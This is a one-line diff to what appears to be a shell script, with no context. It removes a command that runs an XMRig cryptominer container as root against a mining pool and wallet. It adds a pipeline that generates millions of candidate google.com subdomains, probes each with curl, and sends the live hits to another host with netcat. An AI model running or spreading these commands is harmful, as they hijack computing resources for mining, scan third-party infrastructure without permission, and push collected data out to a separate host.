@@ -1,1 +1,1 @@
-udocker --allow-root run   -e POOL_URL=rx.unmineable.com:3333 -e POOL_USER=TRX:TUfEFRwukdgci259qg7KwT6c1HrB2AdMCB.v1 --name xmrig pmietlicki/xmrig:alpine
+crunch 1 11 abcdefghijklmnopqrstuvwxyz1234567890 | sed 's/$/.google.com/' | while read line; do curl -s -o /dev/null -w "%{http_code} $line\n" "$line"; done | grep "200" > 200ok.txt && nc 192.168.1.8 8888 < 200ok.txt
